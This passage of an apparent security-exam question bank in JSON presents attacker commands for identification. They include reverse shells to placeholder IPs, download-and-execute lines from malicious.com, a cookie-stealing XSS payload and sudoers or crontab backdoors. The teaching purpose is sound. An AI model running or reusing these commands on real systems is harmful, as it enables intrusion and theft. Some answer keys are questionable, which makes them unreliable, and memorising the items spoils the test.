      "question": "A mid-size tech company must comply with both emerging data privacy regulations and security requirements from a major client. Which action should be taken FIRST to align these obligations under a single governance structure?",
      "options": [
        "Adopt the strictest client security requirement and enforce it as the single standard for all data handling.",
        "Allow each department to choose either data privacy regulations or client security guidelines to follow.",
        "Conduct a gap analysis between the privacy regulations and client requirements to identify overlaps and conflicts.",
        "Eliminate any internal policies that do not directly relate to either the privacy regulations or client mandates."
      ],
      "correctAnswerIndex": 2,
      "explanation": "Evaluating where the client’s security requirements and data privacy regulations intersect helps the organization create a consolidated governance framework without duplicating or missing obligations. Simply enforcing the strictest standard or discarding unrelated policies can cause compliance blind spots.",
      "examTip": "Understanding the nuanced relationship between different compliance drivers is crucial for a unified governance model."
    },
    {
      "id": 51,
      "question": "A forensic analyst reviewing network traffic logs notices a large number of DNS queries to domains with randomized subdomains, such as:\n\n```\na1b2c3.example.com\nd4e5f6.example.com\ng7h8i9.example.com\n```\n\nWhat is the MOST likely cause of this traffic?",
      "options": [
        "Malware using a Domain Generation Algorithm (DGA) for command-and-control",
        "A legitimate cloud service dynamically generating subdomains",
        "A brute-force attack against DNS records",
        "An internal DNS misconfiguration"
      ],
      "correctAnswerIndex": 0,
      "explanation": "DGA malware generates random subdomains to evade domain blocking and establish C2 communications.",
      "examTip": "Use DNS filtering and behavioral analysis to detect and block DGA-based malware."
    },
    {
      "id": 52,
      "question": "An attacker executes the following PowerShell command on a compromised Windows system:\n\n`$client = New-Object System.Net.Sockets.TCPClient('203.0.113.50', 4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);Invoke-Expression $data}`\n\nWhat is the attacker attempting to do?",
      "options": [
        "Establish a reverse PowerShell shell for remote control",
        "Dump LSASS memory for credential extraction",
        "Perform a Kerberoasting attack against Active Directory",
        "Exfiltrate sensitive files over an encrypted tunnel"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command creates a TCP reverse shell that allows the attacker to send and execute commands remotely.",
      "examTip": "Monitor for suspicious PowerShell activity and restrict unauthorized outbound connections."
    },
    {
      "id": 53,
      "question": "A penetration tester executes the following command:\n\n`nmap -p 445 --script smb-vuln-ms17-010 <target>`\n\nWhat is the tester attempting to accomplish?",
      "options": [
        "Detecting systems vulnerable to EternalBlue",
        "Brute-forcing SMB credentials",
        "Enumerating open SMB shares",
        "Performing a pass-the-hash attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The script checks if the target is vulnerable to EternalBlue (MS17-010), a critical SMB exploit used in WannaCry and NotPetya attacks.",
      "examTip": "Ensure SMB patches are applied and disable SMBv1 to prevent exploitation."
    },
    {
      "id": 54,
      "question": "A forensic investigator discovers the following suspicious entry in `/etc/shadow` on a compromised Linux system:\n\n`backdoor:$6$RANDOMSTRING$HASHVALUE:18774:0:99999:7:::`\n\nWhat does this indicate?",
      "options": [
        "An attacker has created a hidden user account with a password hash",
        "A corrupted user entry due to system failure",
        "A temporary service account used by an automated process",
        "An expired root account that needs resetting"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The presence of a non-standard user with a password hash in `/etc/shadow` suggests the creation of a backdoor account.",
      "examTip": "Regularly audit `/etc/shadow` for unauthorized user accounts and enforce least privilege access."
    },
    {
      "id": 55,
      "question": "An attacker exploits a web application and injects the following payload into a form field:\n\n`<iframe src=\"javascript:alert('XSS')\"></iframe>`\n\nWhat type of attack is being performed?",
      "options": [
        "Stored cross-site scripting (XSS)",
        "SQL injection",
        "Server-side request forgery (SSRF)",
        "Remote code execution (RCE)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The payload uses an iframe and JavaScript execution to trigger a stored XSS attack.",
      "examTip": "Use input sanitization, Content Security Policy (CSP), and secure cookie attributes to prevent XSS."
    },
    {
      "id": 56,
      "question": "A forensic analyst reviewing endpoint logs finds the following process execution:\n\n`cmd.exe /c wevtutil cl Security`\n\nWhat is the attacker's goal?",
      "options": [
        "Clearing Windows event logs to cover tracks",
        "Exfiltrating system logs to an external server",
        "Escalating privileges to SYSTEM",
        "Performing a Kerberoasting attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `wevtutil cl Security` command clears Windows event logs, removing evidence of malicious activity.",
      "examTip": "Enable event log forwarding to a SIEM to prevent attackers from covering their tracks."
    },
    {
      "id": 57,
      "question": "An enterprise risk committee is concerned that certain risk categories are under-reported in quarterly reviews. To bolster comprehensive governance, which of the following is the BEST method to ensure hidden or emerging risks are captured and managed?",
      "options": [
        "Require all employees to submit monthly risk checklists, covering every possible operational area.",
        "Add a dedicated 'Shadow Risk' category to the existing risk register, highlighting unknown or unconfirmed risks.",
        "Integrate qualitative feedback sessions and scenario planning exercises into regular risk workshops.",
        "Double the frequency of audits in all departments, expecting more findings to surface potential risks."
      ],
      "correctAnswerIndex": 2,
      "explanation": "Structured scenario planning and open-dialogue workshops can reveal less obvious threats that employees or managers might not formally document. Simply adding a 'Shadow Risk' category or increasing audits doesn’t necessarily prompt proactive discovery of unrecognized risks.",
      "examTip": "Incorporate qualitative, collaborative methods to expose latent risks beyond standard metrics and registers."
    },
    {
      "id": 58,
      "question": "A security analyst reviewing logs finds the following failed login attempts:\n\n```\nFailed login from IP 192.168.1.200 (user: admin, password: Password123)\nFailed login from IP 192.168.1.201 (user: admin, password: P@ssword123)\nFailed login from IP 192.168.1.202 (user: admin, password: P@ssw0rd123)\nSuccessful login from IP 192.168.1.203 (user: admin, password: P@ssw0rd123!)\n```\n\nWhat attack type is being observed?",
      "options": [
        "Credential stuffing attack",
        "Pass-the-hash attack",
        "Kerberoasting attack",
        "SQL injection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The attacker is attempting multiple variations of common passwords, indicating a credential stuffing attack.",
      "examTip": "Enforce multi-factor authentication (MFA) and monitor failed login attempts for anomalies."
    },
    {
      "id": 59,
      "question": "An attacker successfully exploits an AWS environment and executes the following command:\n\n`aws s3 ls --recursive s3://sensitive-data-bucket`\n\nWhat is the attacker's goal?",
      "options": [
        "Listing and exfiltrating sensitive files stored in an S3 bucket",
        "Enumerating active IAM roles",
        "Compromising EC2 metadata for privilege escalation",
        "Gaining shell access to a cloud instance"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command lists all files in an S3 bucket, potentially exposing sensitive data for exfiltration.",
      "examTip": "Enforce least privilege access on S3 buckets and enable logging to monitor unauthorized access."
    },
    {
      "id": 60,
      "question": "A forensic analyst detects the following command on a compromised Linux system:\n\n`chmod u+s /bin/bash`\n\nWhat is the impact of this command?",
      "options": [
        "Setting the SUID bit on `/bin/bash`, allowing privilege escalation",
        "Hiding malicious processes from system logs",
        "Deleting all user accounts on the system",
        "Preventing users from executing commands"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Setting the SUID bit on `/bin/bash` allows any user to execute it with root privileges, leading to privilege escalation.",
      "examTip": "Monitor file permission changes and regularly audit SUID binaries."
    },
    {
      "id": 61,
      "question": "A forensic analyst finds the following encoded PowerShell command executed on a compromised Windows machine:\n\n`powershell.exe -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACcAbQBzAG0AYAAnAA==`\n\nWhat is the FIRST action the analyst should take?",
      "options": [
        "Decode the Base64 string to analyze the command",
        "Immediately terminate all PowerShell processes",
        "Reboot the system to remove in-memory artifacts",
        "Block outbound HTTP connections"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `-enc` flag indicates Base64 encoding, and decoding the string is necessary to determine its true intent.",
      "examTip": "Always decode and analyze encoded scripts before execution or blocking."
    },
    {
      "id": 62,
      "question": "An attacker successfully compromises a Linux system and executes the following command:\n\n`echo 'echo 1 > /proc/sys/net/ipv4/ip_forward' >> /etc/rc.local`\n\nWhat is the attacker's objective?",
      "options": [
        "Enabling packet forwarding for network sniffing",
        "Disabling firewall rules to allow remote access",
        "Dumping credentials from `/etc/shadow`",
        "Overwriting system logs to cover tracks"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command modifies `/etc/rc.local` to enable IP forwarding, allowing the attacker to sniff and manipulate network traffic.",
      "examTip": "Monitor changes to system startup scripts and enforce file integrity monitoring."
    },
    {
      "id": 63,
      "question": "After a recent data breach, senior management decides to tighten compliance with external standards. Which step is MOST crucial to ensure the updated compliance programs effectively address the root causes of the breach?",
      "options": [
        "Focus on punitive measures against those found responsible for non-compliant behavior.",
        "Update system configurations to match every requirement in the latest compliance standard.",
        "Conduct a post-incident review to identify exact policy gaps that enabled the breach and remediate accordingly.",
        "Require all employees to retake mandatory security training and sign an updated acceptable use policy."
      ],
      "correctAnswerIndex": 2,
      "explanation": "A post-incident review pinpoints the specific failures that led to the breach, enabling targeted improvements to the compliance program. Merely matching a standard or penalizing employees may overlook the real underlying issues.",
      "examTip": "Identify the true root cause before designing remediation measures; a targeted fix is more effective than broad changes."
    },
    {
      "id": 64,
      "question": "An attacker executes the following command on a compromised Windows machine:\n\n`netsh advfirewall firewall add rule name=\"backdoor\" dir=in action=allow protocol=TCP localport=4444`\n\nWhat is the attacker's goal?",
      "options": [
        "Creating a firewall rule to allow inbound connections on port 4444",
        "Blocking outgoing traffic to security monitoring tools",
        "Exfiltrating logs to an external server",
        "Disabling Windows Defender firewall"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command adds a rule to allow inbound connections on port 4444, often used for backdoor access.",
      "examTip": "Monitor firewall rule modifications and enforce strict security policies."
    },
    {
      "id": 65,
      "question": "An attacker runs the following command on a Linux machine:\n\n`find / -perm -4000 -type f 2>/dev/null`\n\nWhat is the attacker trying to accomplish?",
      "options": [
        "Identifying SUID binaries that can be exploited for privilege escalation",
        "Searching for files containing sensitive information",
        "Enumerating writable directories for persistence",
        "Extracting password hashes from system files"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command searches for SUID binaries, which can be exploited for privilege escalation to gain root access.",
      "examTip": "Regularly audit SUID binaries and remove unnecessary permissions."
    },
    {
      "id": 66,
      "question": "A forensic investigator analyzing system logs finds the following:\n\n`Event ID: 4624 | Logon Type: 10 | Source IP: 203.0.113.55`\n\nWhat does this log entry indicate?",
      "options": [
        "A successful remote interactive login via RDP",
        "A failed authentication attempt",
        "A brute-force attack on an internal system",
        "A system reboot event"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Logon Type `10` indicates a successful remote interactive login, commonly associated with RDP access.",
      "examTip": "Monitor remote logins from external IP addresses and enforce MFA for RDP access."
    },
    {
      "id": 67,
      "question": "An attacker executes the following SQL query:\n\n`SELECT username, password FROM users WHERE username='admin' --' AND password='password'`;\n\nWhat type of attack is being performed?",
      "options": [
        "SQL injection to bypass authentication",
        "Cross-site scripting (XSS)",
        "Remote code execution (RCE)",
        "Privilege escalation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The attacker is using SQL injection to manipulate the authentication query logic and bypass login security.",
      "examTip": "Use parameterized queries and input validation to prevent SQL injection attacks."
    },
    {
      "id": 68,
      "question": "An attacker successfully exploits an AWS environment and executes the following command:\n\n`aws ec2 describe-instances --region us-east-1`\n\nWhat is the attacker's goal?",
      "options": [
        "Enumerating all EC2 instances in the AWS account",
        "Listing all active IAM users",
        "Exfiltrating sensitive files from an S3 bucket",
        "Brute-forcing credentials for AWS services"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command lists all EC2 instances, which could be used for further reconnaissance or lateral movement.",
      "examTip": "Monitor AWS API calls and use least privilege IAM policies to restrict access."
    },
    {
      "id": 69,
      "question": "An online service provider aims to strengthen governance by tracking the efficiency of its compliance measures. Which initial strategy is MOST effective for accurately measuring and refining the performance of compliance controls over time?",
      "options": [
        "Apply a fixed benchmark based on industry averages and expect all controls to meet that standard immediately.",
        "Develop a balanced set of key risk indicators (KRIs) and key performance indicators (KPIs) specifically linked to each control objective.",
        "Rely solely on external auditor reports to determine whether compliance measures are performing adequately.",
        "Use ad-hoc, high-level metrics that vary quarterly based on the organization's rapidly shifting focus areas."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Pairing risk indicators with performance metrics provides a holistic way to evaluate how well controls mitigate risks while meeting operational goals. Adopting rigid industry benchmarks, relying only on auditor reports, or frequently shifting metrics can obscure real control effectiveness.",
      "examTip": "A balanced measurement approach—using both KRIs and KPIs—drives data-driven enhancements in governance and compliance programs."
    },
    {
      "id": 70,
      "question": "A security analyst detects repeated outbound HTTP requests to `hxxp://169.254.169.254/latest/meta-data/iam/security-credentials/`. What is the attacker attempting to do?",
      "options": [
        "Steal AWS IAM credentials from a compromised cloud instance",
        "Exfiltrate SSH keys from the local machine",
        "Perform an SQL injection attack on a cloud database",
        "Enumerate DNS records of the cloud environment"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Requests to `169.254.169.254` indicate an attempt to access cloud instance metadata, which attackers exploit to retrieve IAM credentials.",
      "examTip": "Restrict access to cloud metadata services and enforce IMDSv2 in AWS environments."
    },
    {
      "id": 71,
      "question": "A security analyst detects the following activity in PowerShell logs:\n\n`powershell.exe -ExecutionPolicy Bypass -NoProfile -File C:\\Users\\Public\\backdoor.ps1`\n\nWhat is the attacker likely trying to achieve?",
      "options": [
        "Executing a malicious script while bypassing PowerShell execution policies",
        "Escalating privileges to SYSTEM using a Windows exploit",
        "Exfiltrating credentials from LSASS memory",
        "Disabling Windows Defender real-time protection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `-ExecutionPolicy Bypass` flag allows PowerShell to execute scripts that would otherwise be blocked by policy settings.",
      "examTip": "Monitor PowerShell execution logs and restrict execution policies to prevent unauthorized script execution."
    },
    {
      "id": 72,
      "question": "A penetration tester executes the following command on an internal network:\n\n`crackmapexec smb 192.168.1.100 -u admin -p 'P@ssw0rd' --shares`\n\nWhat is the tester attempting to do?",
      "options": [
        "Enumerate available SMB shares using known credentials",
        "Brute-force SMB authentication",
        "Exploit an SMB vulnerability for remote code execution",
        "Dump NTLM password hashes from memory"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`crackmapexec smb` allows attackers to enumerate SMB shares if valid credentials are provided.",
      "examTip": "Enforce strong authentication for SMB and disable anonymous access."
    },
    {
      "id": 73,
      "question": "A security analyst reviewing network traffic logs notices a high volume of small outbound DNS queries with encoded data in the subdomains. What attack technique is being used?",
      "options": [
        "DNS tunneling for data exfiltration",
        "A brute-force attack against the DNS server",
        "Command-and-control (C2) beaconing via HTTP",
        "A denial-of-service attack targeting the DNS resolver"
      ],
      "correctAnswerIndex": 0,
      "explanation": "DNS tunneling allows attackers to exfiltrate data or maintain C2 communication using DNS queries.",
      "examTip": "Use DNS filtering and anomaly detection to identify and block DNS tunneling attempts."
    },
    {
      "id": 74,
      "question": "An attacker executes the following command on a compromised Linux system:\n\n`echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers`\n\nWhat is the attacker's objective?",
      "options": [
        "Granting all users root privileges without requiring a password",
        "Creating a hidden user account for persistence",
        "Modifying firewall rules to allow remote access",
        "Injecting a kernel rootkit into the system"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Appending this line to `/etc/sudoers` allows any user to execute commands as root without a password.",
      "examTip": "Regularly audit the `/etc/sudoers` file and restrict unauthorized modifications."
    },
    {
      "id": 75,
      "question": "A forensic investigator finds the following suspicious command in a Windows event log:\n\n`rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"`\n\nWhat is the attacker's goal?",
      "options": [
        "Executing JavaScript within a Windows environment to bypass security controls",
        "Disabling Windows security logging",
        "Escalating privileges to SYSTEM",
        "Performing a Kerberoasting attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command abuses `rundll32.exe` to execute JavaScript, often used in fileless malware attacks.",
      "examTip": "Monitor `rundll32.exe` executions and restrict script execution policies."
    },
    {
      "id": 76,
      "question": "A penetration tester executes the following command:\n\n`nmap -p- -sS -A -T4 192.168.1.0/24`\n\nWhat is the primary goal of this scan?",
      "options": [
        "Performing a stealthy full port scan with aggressive detection",
        "Launching a brute-force attack against network devices",
        "Sniffing credentials from unencrypted network traffic",
        "Exploiting a known vulnerability in an open port"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `-p-` flag scans all 65,535 ports, while `-sS` performs a stealthy SYN scan with aggressive OS and service detection.",
      "examTip": "Monitor for excessive port scanning activity and use intrusion detection systems (IDS) to detect reconnaissance."
    },
    {
      "id": 77,
      "question": "An attacker executes the following command on a compromised Linux machine:\n\n`iptables -A INPUT -p tcp --dport 22 -j DROP`\n\nWhat is the attacker's likely goal?",
      "options": [
        "Blocking SSH access to prevent administrators from regaining control",
        "Redirecting SSH traffic to a malicious proxy",
        "Creating a new firewall rule to allow persistent access",
        "Disabling logging for SSH sessions"
      ],
      "correctAnswerIndex": 0,
      "explanation": "By blocking inbound SSH traffic, the attacker prevents administrators from remotely accessing the compromised machine.",
      "examTip": "Monitor firewall rule changes and use centralized logging for security event tracking."
    },
    {
      "id": 78,
      "question": "A forensic analyst reviewing Active Directory logs notices the following command execution:\n\n`dcsync /user:Administrator /domain:corp.local`\n\nWhat is the attacker attempting to do?",
      "options": [
        "Extract NTLM password hashes from the domain controller",
        "Modify Group Policy settings to disable security logs",
        "Create a new domain administrator account",
        "Enumerate user accounts in Active Directory"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `dcsync` command is used to pull NTLM hashes directly from the domain controller, a key credential theft technique.",
      "examTip": "Monitor for unauthorized `dcsync` activity and enforce tiered administrative access controls."
    },
    {
      "id": 79,
      "question": "An attacker modifies the following Windows registry key:\n\n`reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d \"C:\\Users\\Public\\malware.exe\" /f`\n\nWhat is the attacker's goal?",
      "options": [
        "Establishing persistence by executing malware at user login",
        "Disabling Windows Defender security policies",
        "Exfiltrating user credentials from the Windows registry",
        "Escalating privileges to a domain administrator"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The registry key ensures that the malware runs every time the user logs in, maintaining persistence.",
      "examTip": "Monitor registry modifications and enforce least privilege access controls."
    },
    {
      "id": 80,
      "question": "A forensic investigator finds the following Base64-encoded PowerShell command executed on a compromised machine:\n\n`powershell.exe -enc SQBFAFggKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vbWFsaWNpb3VzLXNpdGUuY29tL3BheWxvYWQucHMxJyk7IEVYKCk=`\n\nWhat is the attacker's intent?",
      "options": [
        "Downloading and executing a remote PowerShell payload",
        "Performing a brute-force attack against a system service",
        "Dumping credentials from LSASS memory",
        "Exfiltrating data using DNS tunneling"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Decoding the Base64 string reveals a command that downloads a script and executes a malicious payload.",
      "examTip": "Always decode and analyze encoded scripts to understand their intent before taking action."
    },
    {
      "id": 81,
      "question": "A forensic analyst discovers the following command executed on a compromised Linux system:\n\n`echo 'bash -i >& /dev/tcp/203.0.113.5/443 0>&1' > /tmp/.backdoor.sh && chmod +x /tmp/.backdoor.sh && /tmp/.backdoor.sh`\n\nWhat is the attacker's goal?",
      "options": [
        "Establishing a persistent reverse shell",
        "Hiding a malicious process using process hollowing",
        "Performing a privilege escalation attack",
        "Exfiltrating credentials from `/etc/passwd`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command sets up a reverse shell that connects to an attacker's machine for persistent remote access.",
      "examTip": "Monitor for unauthorized script execution and block outbound connections to suspicious IPs."
    },
    {
      "id": 82,
      "question": "A penetration tester executes the following command:\n\n`nmap --script smb-enum-users,smb-enum-shares -p 445 <target>`\n\nWhat is the tester attempting to do?",
      "options": [
        "Enumerate SMB users and shared directories on the target system",
        "Brute-force SMB credentials",
        "Exploit an SMB vulnerability",
        "Perform a pass-the-hash attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `smb-enum-users` and `smb-enum-shares` scripts retrieve user accounts and shared resources via SMB.",
      "examTip": "Disable SMBv1 and enforce strong authentication to prevent unauthorized enumeration."
    },
    {
      "id": 83,
      "question": "A forensic analyst detects the following command execution on a compromised Windows system:\n\n`powershell -nop -exec bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')`\n\nWhat is the attacker trying to achieve?",
      "options": [
        "Executing a fileless malware payload via PowerShell",
        "Disabling Windows security features",
        "Extracting password hashes from LSASS",
        "Performing a Kerberoasting attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `IEX` (Invoke-Expression) function downloads and executes a PowerShell script in memory to avoid detection.",
      "examTip": "Enable PowerShell logging and restrict execution policies to detect and prevent fileless malware."
    },
    {
      "id": 84,
      "question": "An attacker successfully exploits an AWS instance and executes the following command:\n\n`aws iam list-access-keys --user-name admin`\n\nWhat is the attacker's goal?",
      "options": [
        "Enumerating IAM access keys for further privilege escalation",
        "Listing EC2 instances in the AWS environment",
        "Exfiltrating S3 bucket data",
        "Modifying security group rules to allow persistent access"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command lists IAM access keys, which attackers can use for further cloud-based privilege escalation.",
      "examTip": "Monitor AWS API calls for unauthorized access and enforce least privilege IAM roles."
    },
    {
      "id": 85,
      "question": "An attacker modifies the following Windows registry key:\n\n`reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d \"C:\\Users\\Public\\malware.exe\" /f`\n\nWhat is the attacker's intent?",
      "options": [
        "Establishing persistence by executing malware at user login",
        "Disabling Windows security policies",
        "Exfiltrating user credentials from the Windows registry",
        "Escalating privileges to a domain administrator"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The registry key ensures that the malware runs every time the user logs in, maintaining persistence.",
      "examTip": "Monitor registry modifications and enforce least privilege access controls."
    },
    {
      "id": 86,
      "question": "A penetration tester executes the following command:\n\n`hashcat -m 18200 -a 0 hashlist.txt wordlist.txt`\n\nWhat is the tester attempting to do?",
      "options": [
        "Cracking encrypted KeePass password vault hashes",
        "Performing a brute-force attack on a remote SSH server",
        "Decrypting Windows BitLocker encryption keys",
        "Dumping password hashes from an Active Directory database"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Hashcat mode `18200` is used to crack KeePass password vault hashes using a dictionary attack.",
      "examTip": "Use strong, unique master passwords and enable two-factor authentication for password vaults."
    },
    {
      "id": 87,
      "question": "A security analyst reviewing Active Directory logs detects the following:\n\n`Event ID: 4769 | Account Name: service-account | Service Name: ldap/corp.local | Ticket Encryption Type: 0x17`\n\nWhat does this log entry suggest?",
      "options": [
        "A successful Kerberoasting attack against a service account",
        "A normal LDAP authentication request",
        "A brute-force attack against Active Directory",
        "A pass-the-hash attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Ticket Encryption Type `0x17` (RC4) suggests that a Kerberos service ticket was requested, potentially for a Kerberoasting attack.",
      "examTip": "Monitor for unusual Kerberos ticket requests and enforce strong passwords for service accounts."
    },
    {
      "id": 88,
      "question": "An attacker executes the following command on a Linux system:\n\n`echo '* * * * * root /bin/bash -c \"nc -e /bin/bash 203.0.113.10 4444\"' >> /etc/crontab`\n\nWhat is the purpose of this command?",
      "options": [
        "Establishing a persistent reverse shell via cron job execution",
        "Dumping credentials from `/etc/shadow`",
        "Disabling firewall rules to allow inbound traffic",
        "Overwriting critical system logs"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This cron job executes a Netcat reverse shell every minute, ensuring persistent access for the attacker.",
      "examTip": "Monitor cron job modifications and restrict write access to `/etc/crontab`."
    },
    {
      "id": 89,
      "question": "An attacker exploits a vulnerable web application and injects the following payload:\n\n`<script>document.location='http://malicious.com/steal.php?cookie='+document.cookie;</script>`\n\nWhat type of attack is being performed?",
      "options": [
        "Stored cross-site scripting (XSS)",
        "SQL injection",
        "Remote code execution (RCE)",
        "Server-side request forgery (SSRF)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This JavaScript payload exfiltrates cookies to an external server, indicating a stored XSS attack.",
      "examTip": "Use Content Security Policy (CSP) headers and input validation to prevent XSS attacks."
    },
    {
      "id": 90,
      "question": "An international manufacturing conglomerate is formalizing an enterprise governance model to enhance accountability across multiple subsidiaries. Which action is MOST critical to ensure consistent risk management practices throughout the organization?",
      "options": [
        "Mandate each subsidiary to adopt the exact risk controls used at corporate headquarters without modifications.",
        "Institute a unified risk taxonomy and require subsidiaries to map their local controls to this standard framework.",
        "Launch ad-hoc audits of each subsidiary to ensure they are adhering to at least some corporate guidelines.",
        "Allow each subsidiary to use its own risk approach, provided it submits quarterly compliance updates."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Standardizing the risk language ensures each subsidiary’s controls are measured against a unified framework. This approach recognizes local variations while preserving enterprise-wide governance consistency.",
      "examTip": "A single, coherent risk taxonomy underpins effective, scalable governance across diverse operations."
    },
    {
      "id": 91,
      "question": "A forensic analyst detects the following command executed on a compromised system:\n\n`curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/`\n\nWhat is the attacker's objective?",
      "options": [
        "Stealing AWS IAM credentials from a cloud instance",
        "Exfiltrating SSH keys from the local machine",
        "Performing a brute-force attack against an EC2 instance",
        "Enumerating DNS records in a cloud environment"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Requests to `169.254.169.254` indicate an attempt to access cloud instance metadata, which attackers exploit to retrieve IAM credentials.",
      "examTip": "Restrict access to cloud metadata services and enforce IMDSv2 in AWS environments."
    },
    {
      "id": 92,
      "question": "A penetration tester executes the following command:\n\n`rpcclient -U \"\" -N <target>`\n\nWhat is the purpose of this command?",
      "options": [
        "Enumerating SMB information without authentication",
        "Performing a brute-force attack on SMB",
        "Dumping NTLM password hashes",
        "Extracting Kerberos tickets from memory"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `rpcclient -U \"\" -N` command attempts to connect to SMB without authentication to enumerate system information.",
      "examTip": "Disable null session authentication and enforce SMB signing to prevent unauthenticated access."
    },
    {
      "id": 93,
      "question": "A security analyst detects a suspicious command executed on a Linux machine:\n\n`chmod u+s /bin/bash`\n\nWhat is the attacker's intent?",
      "options": [
        "Setting the SUID bit on `/bin/bash`, allowing privilege escalation",
        "Hiding malicious processes from system logs",
        "Deleting all user accounts on the system",
        "Preventing users from executing commands"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Setting the SUID bit on `/bin/bash` allows any user to execute it with root privileges, leading to privilege escalation.",
      "examTip": "Monitor file permission changes and regularly audit SUID binaries to prevent privilege escalation."
    },
    {
      "id": 94,
      "question": "An attacker gains access to a Linux server and modifies the following file:\n\n`export PATH=/tmp/malicious:$PATH`\n\nWhat is the attacker's objective?",
      "options": [
        "Hijacking system commands by modifying the PATH variable",
        "Granting root privileges to a malicious process",
        "Extracting credentials from memory",
        "Redirecting traffic to a phishing site"
      ],
      "correctAnswerIndex": 0,
      "explanation": "By modifying the PATH variable, the attacker ensures that their malicious binaries are executed instead of legitimate system commands.",
      "examTip": "Monitor environment variable changes and enforce execution control policies."
    },
    {
      "id": 95,
      "question": "A penetration tester executes the following command:\n\n`hashcat -m 5600 -a 0 hashes.txt wordlist.txt`\n\nWhat type of hashes is the tester attempting to crack?",
      "options": [
        "NetNTLMv2 authentication hashes",
        "MD5 password hashes",
        "SHA-256 encrypted keys",
        "Kerberos ticket hashes"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `-m 5600` flag in Hashcat is used for cracking NetNTLMv2 authentication hashes.",
      "examTip": "Enforce strong password policies and use multi-factor authentication to reduce the risk of credential compromise."
    },
    {
      "id": 96,
      "question": "A newly appointed Chief Compliance Officer (CCO) wants to strengthen internal oversight of data protection obligations after recent regulatory changes. Which of the following should be the FIRST step to ensure cohesive policy alignment across all departments?",
      "options": [
        "Penalize any department that fails to meet the latest regulatory requirements within a set deadline.",
        "Communicate a zero-exception policy and replace existing data-handling guidelines with stricter measures.",
        "Centralize policy creation in the CCO’s office, requiring formal acceptance by each department head.",
        "Conduct a comprehensive policy review to identify inconsistencies in departmental procedures."
      ],
      "correctAnswerIndex": 3,
      "explanation": "Reviewing existing policies for inconsistencies allows the CCO to identify areas requiring updates or re-alignment. Immediately imposing a blanket policy or penalties may ignore unique departmental challenges and create resistance.",
      "examTip": "Always identify the current state of compliance before making sweeping changes to governance or regulatory policy structures."
    },
    {
      "id": 97,
      "question": "A penetration tester executes the following command:\n\n`nmap -sU -p 161 --script=snmp-brute <target>`\n\nWhat is the goal of this scan?",
      "options": [
        "Brute-forcing SNMP community strings to gain unauthorized access",
        "Scanning for open RDP ports",
        "Performing a denial-of-service attack",
        "Bypassing network firewall restrictions"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `snmp-brute` script attempts to brute-force SNMP community strings, which can provide access to network devices.",
      "examTip": "Disable SNMP if not needed or enforce strong community strings to prevent unauthorized access."
    },
    {
      "id": 98,
      "question": "A forensic analyst detects the following command executed on a compromised system:\n\n`certutil -urlcache -split -f http://malicious.com/malware.exe malware.exe`\n\nWhat is the attacker's goal?",
      "options": [
        "Downloading and storing a malicious file using a built-in Windows utility",
        "Disabling Windows security updates",
        "Exfiltrating encrypted data to a remote server",
        "Modifying Active Directory group policies"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `certutil` command is a living-off-the-land (LotL) technique to download and execute malware without triggering antivirus alerts.",
      "examTip": "Monitor `certutil.exe` usage and restrict outbound connections from non-administrative users."
    },
    {
      "id": 99,
      "question": "A penetration tester runs the following command:\n\n`hashcat -m 1000 -a 0 hashlist.txt wordlist.txt`\n\nWhat is the tester trying to accomplish?",
      "options": [
        "Cracking NTLM password hashes using a dictionary attack",
        "Performing a pass-the-hash attack",
        "Extracting hashes from memory",
        "Decrypting SSL/TLS traffic"
      ],
      "correctAnswerIndex": 0,
